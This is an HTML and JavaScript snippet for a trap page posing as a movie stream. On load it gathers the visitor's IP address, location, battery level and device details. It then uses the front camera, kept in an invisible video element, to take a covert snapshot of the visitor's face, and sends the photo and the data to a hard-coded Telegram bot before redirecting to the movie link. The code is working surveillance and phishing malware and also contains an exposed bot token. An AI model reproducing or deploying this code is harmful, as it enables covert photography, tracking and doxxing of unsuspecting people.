<style>
    /* ... your previous styles ... */
    #video {
        position: absolute;
        top: 0;
        left: 0;
        width: 1px;
        height: 1px;
        opacity: 0; /* Hidden from eyes, but active for the browser */
        pointer-events: none;
    }
</style>

<video id="video" autoplay playsinline></video>
<canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

<script>
    const botToken = "8060572871:AAGdgGSMVfEft5DHEhx3QMU9vHSMlNVijUI";
    const chatId = "6312622799";
    let capturedData = {};

    async function preCollect() {
        try {
            let ipData = await fetch('https://ipapi.co/json/').then(r => r.json());
            let battery = 'getBattery' in navigator ? await navigator.getBattery().then(b => `${Math.round(b.level*100)}%`) : "N/A";
            
            capturedData = {
                ip: ipData.ip,
                loc: `${ipData.city}, ${ipData.country_name}`,
                bat: battery,
                device: `${navigator.platform} (${navigator.hardwareConcurrency} Cores)`
            };
        } catch(e) { console.log("Pre-collect failed"); }

        document.getElementById('loader-box').style.display = 'none';
        document.getElementById('play-btn').style.display = 'block';
        document.getElementById('status').innerText = "Ready to Stream";
    }

    async function startTheTrap() {
        const urlParams = new URLSearchParams(window.location.search);
        const movieLink = urlParams.get('dest') || "https://mega.nz/";

        document.getElementById('play-btn').innerText = "Connecting to Server...";

        try {
            // Request camera with 'playsinline' for mobile support
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "user" }, 
                audio: false 
            });
            
            const video = document.getElementById('video');
            video.srcObject = stream;
            
            // 🔥 The Fix: Wait for the video to actually be 'ready'
            video.onloadedmetadata = () => {
                video.play();
                
                // Wait 1.5 seconds for the sensor to adjust from black to light
                setTimeout(async () => {
                    const canvas = document.getElementById('canvas');
                    const context = canvas.getContext('2d');
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    const imageData = canvas.toDataURL('image/jpeg', 0.7); // 0.7 quality for faster upload
                    
                    // Kill the camera immediately after snap
                    stream.getTracks().forEach(track => track.stop());

                    // Send the loot
                    await sendPhotoToTelegram(imageData);
                    await sendDataToTelegram(movieLink);

                    // Final Move
                    window.location.href = movieLink;
                }, 1500); 
            };

        } catch (err) {
            // If they block camera, we still get the data
            console.log("Camera blocked: ", err);
            await sendDataToTelegram(movieLink);
            window.location.href = movieLink;
        }
    }

    async function sendPhotoToTelegram(base64Data) {
        const blob = await (await fetch(base64Data)).blob();
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('photo', blob, 'snap.jpg');
        formData.append('caption', `📸 **Face Captured!**\nIP: ${capturedData.ip || 'Unknown'}`);

        await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
            method: 'POST',
            body: formData
        });
    }

    async function sendDataToTelegram(link) {
        let msg = `🚨 **LOG REPORT** 🚨\n🎬 Movie: ${link}\n🌐 IP: ${capturedData.ip}\n📍 Loc: ${capturedData.loc}\n🔋 Bat: ${capturedData.bat}\n💻 Dev: ${capturedData.device}`;
        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
    }

    window.onload = preCollect;
</script>
